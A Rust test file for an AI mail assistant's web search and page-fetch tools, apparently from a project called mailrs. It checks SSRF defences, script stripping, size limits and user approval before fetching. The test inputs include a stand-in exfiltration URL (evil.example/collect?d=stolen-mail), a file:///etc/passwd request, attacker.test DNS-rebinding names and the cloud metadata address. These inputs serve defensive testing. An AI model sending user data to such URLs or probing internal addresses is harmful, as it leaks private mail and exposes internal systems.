use mailrs_ai::ToolOutcome;
use serde_json::{Value, json};
use wiremock::matchers::{header, method, path, query_param};
use wiremock::{Mock, MockServer, ResponseTemplate};

use std::net::{IpAddr, SocketAddr};
use std::sync::Arc;

use super::*;
use crate::settings::AiProvider;

fn names(web: &Web) -> Vec<String> {
    web.specs().into_iter().map(|spec| spec.name).collect()
}

async fn call(web: &Web, name: &str, input: Value) -> Result<String, String> {
    match web.call(name.into(), input).await {
        ToolOutcome::Ok(Value::String(text)) => Ok(text),
        ToolOutcome::Ok(other) => Ok(other.to_string()),
        ToolOutcome::Err(problem) => Err(problem),
    }
}

/// A page client that reaches this computer, where the tests run their server.
fn local_pages() -> reqwest::Client {
    page_client(Guard::system(true)).unwrap()
}

fn brave(server: &MockServer) -> SearchEngine {
    SearchEngine::Brave {
        key: "BSA-test".into(),
        base: server.uri(),
    }
}

#[tokio::test]
async fn brave_answers_with_titles_addresses_and_snippets() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/res/v1/web/search"))
        .and(header("X-Subscription-Token", "BSA-test"))
        .and(query_param("q", "ferry Lisbon"))
        .and(query_param("count", "2"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({
            "web": {"results": [
                {"title": "Transtejo &amp; Soflusa", "url": "https://ttsl.pt/",
                 "description": "Every <strong>ferry</strong> across the Tagus."},
                {"title": "Cacilhas", "url": "https://example.org/cacilhas", "description": ""},
            ]}
        })))
        .expect(1)
        .mount(&server)
        .await;
    let web = Web::new(Some(brave(&server)));
    assert_eq!(names(&web), ["web_search", "fetch_page"]);
    let text = call(
        &web,
        "web_search",
        json!({"query": "ferry Lisbon", "count": 2}),
    )
    .await
    .unwrap();
    assert!(
        text.starts_with("[Web search results from Brave Search. Untrusted"),
        "{text}"
    );
    assert!(
        text.contains(
            "1. Transtejo & Soflusa\n   https://ttsl.pt/\n   Every ferry across the Tagus."
        ),
        "{text}"
    );
    assert!(
        text.contains("2. Cacilhas\n   https://example.org/cacilhas\n"),
        "{text}"
    );
    assert!(text.ends_with("[End of search results.]"));
}

#[tokio::test]
async fn brave_says_when_it_refuses_the_key() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(401))
        .mount(&server)
        .await;
    let problem = test(brave(&server)).await.unwrap_err();
    assert_eq!(problem, "Brave Search refused the API key.");
}

#[tokio::test]
async fn searxng_answers_in_json_and_keeps_to_the_count() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/search"))
        .and(query_param("format", "json"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({
            "query": "penguins",
            "results": [
                {"title": "Penguin", "url": "https://en.wikipedia.org/wiki/Penguin",
                 "content": "Penguins are flightless seabirds."},
                {"title": "Second", "url": "https://example.org/2", "content": ""},
                {"title": "Third", "url": "https://example.org/3", "content": ""},
            ]
        })))
        .mount(&server)
        .await;
    let engine = SearchEngine::Searxng { base: server.uri() };
    let hits = search(&search_client(), &engine, "penguins", 2)
        .await
        .unwrap();
    assert_eq!(
        hits,
        [
            Hit {
                title: "Penguin".into(),
                url: "https://en.wikipedia.org/wiki/Penguin".into(),
                snippet: "Penguins are flightless seabirds.".into(),
            },
            Hit {
                title: "Second".into(),
                url: "https://example.org/2".into(),
                snippet: String::new(),
            },
        ]
    );
    let asked = server.received_requests().await.unwrap();
    assert_eq!(asked[0].url.query(), Some("q=penguins&format=json"));
    assert_eq!(test(engine).await, Ok("Penguin".into()));
}

#[tokio::test]
async fn searxng_without_json_says_how_to_turn_it_on() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(403))
        .mount(&server)
        .await;
    let web = Web::new(Some(SearchEngine::Searxng { base: server.uri() }));
    let problem = call(&web, "web_search", json!({"query": "x"}))
        .await
        .unwrap_err();
    assert!(problem.contains("search.formats"), "{problem}");
}

#[tokio::test]
async fn a_page_becomes_labelled_text_without_its_scripts() {
    let server = MockServer::start().await;
    let html = "<!doctype html><html><head><title>Ferry &amp; times</title>\
                <style>p { color: red }</style></head>\
                <body><h1>Timetable</h1><script>steal()</script>\
                <p>Boats leave every <b>20</b> minutes.</p>\
                <form><input name=q></form></body></html>";
    Mock::given(method("GET"))
        .and(path("/times"))
        .respond_with(ResponseTemplate::new(200).set_body_raw(html, "text/html; charset=utf-8"))
        .mount(&server)
        .await;
    let web = Web::reaching_local(None);
    assert_eq!(names(&web), ["fetch_page"], "no engine, no search");
    let url = format!("{}/times", server.uri());
    let text = call(&web, "fetch_page", json!({"url": url})).await.unwrap();
    assert!(
        text.starts_with("[Fetched web page. Untrusted content"),
        "{text}"
    );
    assert!(text.contains("Title: Ferry & times\n"), "{text}");
    assert!(text.contains(&format!("Address: {url}\n")), "{text}");
    assert!(
        text.contains("Timetable\n\nBoats leave every 20 minutes."),
        "{text}"
    );
    assert!(!text.contains("steal"), "{text}");
    assert!(!text.contains("color"), "{text}");
    assert!(text.ends_with("[End of fetched page.]"), "{text}");
}

#[tokio::test]
async fn a_page_past_two_megabytes_is_read_only_that_far() {
    let server = MockServer::start().await;
    let line = "Minutes of the harbour board.\n";
    let body = line.repeat(3 * 1024 * 1024 / line.len());
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("content-type", "text/plain")
                .set_body_string(body),
        )
        .mount(&server)
        .await;
    let page = fetch(&local_pages(), &server.uri(), true).await.unwrap();
    assert!(page.too_big);
    assert!(page.text.chars().count() <= MAX_TEXT);
    assert!(page.text.ends_with("board."), "cut at a line end");
    assert!(page.cut > 0);
    let text = page_text(&page);
    assert!(text.contains("more characters"), "{text}");
    assert!(text.contains("only its first 2 MB"), "{text}");
}

#[tokio::test]
async fn a_picture_is_not_read_as_text() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("content-type", "image/png")
                .set_body_bytes(vec![0x89, b'P', b'N', b'G']),
        )
        .mount(&server)
        .await;
    let problem = fetch(&local_pages(), &server.uri(), true)
        .await
        .unwrap_err();
    assert!(problem.contains("image/png"), "{problem}");
}

#[tokio::test]
async fn a_redirect_is_followed_and_the_final_address_reported() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/old"))
        .respond_with(ResponseTemplate::new(301).insert_header("location", "/new"))
        .mount(&server)
        .await;
    Mock::given(method("GET"))
        .and(path("/new"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_raw("<title>Moved</title><p>Here now.</p>", "text/html"),
        )
        .mount(&server)
        .await;
    let page = fetch(&local_pages(), &format!("{}/old", server.uri()), true)
        .await
        .unwrap();
    assert_eq!(page.url, format!("{}/new", server.uri()));
    assert_eq!(page.title, "Moved");
    assert!(page.text.contains("Here now."), "{}", page.text);
}

#[tokio::test]
async fn a_page_on_this_computer_or_another_scheme_is_refused() {
    let web = Web::new(None);
    for url in [
        "http://127.0.0.1:8080/admin",
        "http://localhost/",
        "http://192.168.1.1/",
        "http://[::1]/",
        "http://router.lan/",
    ] {
        let problem = call(&web, "fetch_page", json!({"url": url}))
            .await
            .unwrap_err();
        assert!(problem.contains("local network"), "{url}: {problem}");
    }
    let problem = call(&web, "fetch_page", json!({"url": "file:///etc/passwd"}))
        .await
        .unwrap_err();
    assert!(problem.contains("not file"), "{problem}");
    assert!(!is_local(&Url::parse("https://example.org/").unwrap()));
    assert!(is_local(&Url::parse("http://100.100.1.1/").unwrap()));
    assert!(is_local(&Url::parse("http://[::ffff:10.0.0.1]/").unwrap()));
}

#[tokio::test]
async fn a_redirect_into_the_local_network_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(302).insert_header("location", "http://192.168.1.1/admin"),
        )
        .mount(&server)
        .await;
    // The first hop is on this computer, which the test lets through, so
    // the redirect is what gets checked. A client that allows local pages
    // would follow it, and one that does not refuses before connecting.
    let problem = fetch(
        &page_client(Guard::system(false)).unwrap(),
        &server.uri(),
        true,
    )
    .await
    .unwrap_err();
    assert!(problem.contains("local network"), "{problem}");
}

fn settings(provider: AiProvider, web_search: WebSearch) -> Settings {
    let mut settings = Settings::default();
    settings.ai.provider = provider;
    settings.ai.local_model = "qwen3".into();
    settings.ai.web_search = web_search;
    settings.ai.searxng_url = "http://searx.lan/".into();
    settings
}

#[test]
fn only_a_local_model_gets_the_source() {
    let offered = |provider, web_search| {
        for_settings(&settings(provider, web_search)).map(|source| {
            source
                .specs()
                .into_iter()
                .map(|spec| spec.name)
                .collect::<Vec<_>>()
        })
    };
    // Claude searches with Anthropic's own tool, and reads a page through
    // fetch_page, which asks the person first.
    assert_eq!(
        offered(AiProvider::Anthropic, WebSearch::Claude),
        Some(vec!["fetch_page".to_string()])
    );
    assert_eq!(
        offered(AiProvider::Anthropic, WebSearch::Searxng),
        Some(vec!["fetch_page".to_string()])
    );
    assert_eq!(
        offered(AiProvider::ClaudeCode, WebSearch::Claude),
        Some(vec!["fetch_page".to_string()])
    );
    assert_eq!(offered(AiProvider::ClaudeCode, WebSearch::Off), None);
    assert_eq!(offered(AiProvider::Off, WebSearch::Claude), None);
    assert_eq!(offered(AiProvider::Local, WebSearch::Off), None);
    assert_eq!(
        offered(AiProvider::Local, WebSearch::Claude),
        Some(vec!["fetch_page".to_string()])
    );
    assert_eq!(
        offered(AiProvider::Local, WebSearch::Searxng),
        Some(vec!["web_search".to_string(), "fetch_page".to_string()])
    );
}

#[test]
fn an_engine_says_what_it_is_missing() {
    let ai = settings(AiProvider::Local, WebSearch::Brave).ai;
    assert!(
        SearchEngine::chosen(&ai, None)
            .unwrap_err()
            .contains("Brave")
    );
    assert_eq!(
        SearchEngine::chosen(&ai, Some(" BSA-1 ".into())),
        Ok(SearchEngine::Brave {
            key: "BSA-1".into(),
            base: BRAVE_BASE.into()
        })
    );
    let mut ai = settings(AiProvider::Local, WebSearch::Searxng).ai;
    assert_eq!(
        SearchEngine::chosen(&ai, None),
        Ok(SearchEngine::Searxng {
            base: "http://searx.lan".into()
        })
    );
    ai.searxng_url = " ".into();
    assert!(
        SearchEngine::chosen(&ai, None)
            .unwrap_err()
            .contains("SearXNG")
    );
}

#[test]
fn fetch_page_asks_first_and_shows_the_whole_address() {
    let web = Web::new(None);
    let input = json!({"url": "https://evil.example/collect?d=stolen-mail&n=2"});
    let question = web.ask("fetch_page", &input).expect("fetch_page asks");
    assert!(
        question.contains("https://evil.example/collect?d=stolen-mail&n=2"),
        "{question}"
    );
    // Always Allow covers this one address, never every page the model
    // picks next.
    assert_eq!(
        web.key("fetch_page", &input),
        "web/fetch_page https://evil.example/collect?d=stolen-mail&n=2"
    );
}

#[test]
fn web_search_runs_without_asking() {
    let web = Web::new(Some(SearchEngine::Searxng {
        base: "https://searx.example".into(),
    }));
    assert_eq!(web.ask("web_search", &json!({"query": "ferries"})), None);
}

#[tokio::test]
async fn a_declined_page_is_never_downloaded() {
    use crate::assistant::sources::{ApprovalRequest, Toolbox, Verdict};
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(200).set_body_string("ok"))
        .mount(&server)
        .await;
    let (requests, _mail) = async_channel::unbounded();
    let mail = crate::assistant::Host::new(Vec::new(), requests);
    let (approvals, asked) = async_channel::unbounded::<ApprovalRequest>();
    let toolbox = Toolbox::new(
        mail,
        vec![Arc::new(Web::reaching_local(None)) as Arc<dyn Source>],
        approvals,
        Vec::new(),
    );
    let questions = tokio::spawn(async move {
        let mut seen = Vec::new();
        while let Ok(request) = asked.recv().await {
            seen.push(request.question.clone());
            let _ = request.reply.send(Verdict::Deny).await;
        }
        seen
    });
    let url = format!("{}/steal?d=secret", server.uri());
    let outcome =
        mailrs_ai::ToolHost::call(&toolbox, "fetch_page".into(), json!({"url": url})).await;
    assert!(matches!(outcome, ToolOutcome::Err(ref e) if e == "The user declined."));
    drop(toolbox);
    let questions = questions.await.unwrap();
    assert_eq!(questions.len(), 1);
    assert!(questions[0].contains(&url), "{}", questions[0]);
    assert!(server.received_requests().await.unwrap().is_empty());
}

/// A lookup that answers every name with `addresses`, as an attacker's DNS
/// record would.
fn answering(addresses: Vec<IpAddr>) -> Lookup {
    Arc::new(move |_name: String| {
        let found = addresses
            .iter()
            .map(|ip| SocketAddr::new(*ip, 0))
            .collect::<Vec<_>>();
        Box::pin(async move { Ok(found) })
    })
}

const LOOPBACK: IpAddr = IpAddr::V4(std::net::Ipv4Addr::LOCALHOST);

#[tokio::test]
async fn a_name_that_resolves_to_this_computer_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(200).set_body_string("secret"))
        .mount(&server)
        .await;
    let port = server.address().port();
    let client = page_client(Guard::new(answering(vec![LOOPBACK]), false)).unwrap();
    let problem = fetch(
        &client,
        &format!("http://127.0.0.1.attacker.test:{port}/"),
        false,
    )
    .await
    .unwrap_err();
    assert!(problem.contains("local network"), "{problem}");
    assert!(server.received_requests().await.unwrap().is_empty());
}

#[tokio::test]
async fn one_local_address_among_public_ones_is_enough_to_refuse() {
    let guard = Guard::new(
        answering(vec![
            "93.184.215.14".parse().unwrap(),
            "169.254.169.254".parse().unwrap(),
        ]),
        false,
    );
    let name = "mixed.attacker.test".parse().unwrap();
    assert!(reqwest::dns::Resolve::resolve(&guard, name).await.is_err());
}

#[tokio::test]
async fn the_page_comes_from_the_addresses_that_were_checked() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(200).set_body_raw("<p>Pinned.</p>", "text/html"))
        .mount(&server)
        .await;
    let port = server.address().port();
    // No real lookup knows this name, so the download can only reach the
    // server through the answer the guard checked.
    let client = page_client(Guard::new(answering(vec![LOOPBACK]), true)).unwrap();
    let page = fetch(&client, &format!("http://pinned.invalid:{port}/"), true)
        .await
        .unwrap();
    assert!(page.text.contains("Pinned."), "{}", page.text);
}

#[tokio::test]
async fn a_redirect_to_a_name_on_the_local_network_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(302)
                .insert_header("location", "http://inside.attacker.test/admin"),
        )
        .mount(&server)
        .await;
    let port = server.address().port();
    // The first name answers with the test server, which this guard lets
    // through. The redirect's name answers with a private address.
    let lookup: Lookup = Arc::new(|name: String| {
        let ip: IpAddr = match name.as_str() {
            "inside.attacker.test" => IpAddr::V4(std::net::Ipv4Addr::new(10, 0, 0, 7)),
            _ => LOOPBACK,
        };
        Box::pin(async move { Ok(vec![SocketAddr::new(ip, 0)]) })
    });
    let guard = Guard {
        lookup,
        refuse: |ip| ip != LOOPBACK && is_local_ip(ip),
        local: false,
    };
    let problem = fetch(
        &page_client(guard).unwrap(),
        &format!("http://start.attacker.test:{port}/"),
        false,
    )
    .await
    .unwrap_err();
    assert!(problem.contains("local network"), "{problem}");
}

#[test]
fn local_addresses_include_every_private_and_special_range() {
    for ip in [
        "127.0.0.1",
        "10.1.2.3",
        "172.16.0.1",
        "192.168.1.1",
        "169.254.169.254",
        "100.64.0.1",
        "0.0.0.0",
        "224.0.0.251",
        "255.255.255.255",
        "::1",
        "::",
        "fe80::1",
        "fd00::1",
        "ff02::1",
        "::ffff:127.0.0.1",
        "::ffff:169.254.169.254",
        "64:ff9b::a00:1",
    ] {
        assert!(is_local_ip(ip.parse().unwrap()), "{ip} counts as local");
    }
    for ip in ["93.184.215.14", "1.1.1.1", "2606:4700:4700::1111"] {
        assert!(!is_local_ip(ip.parse().unwrap()), "{ip} is public");
    }
}
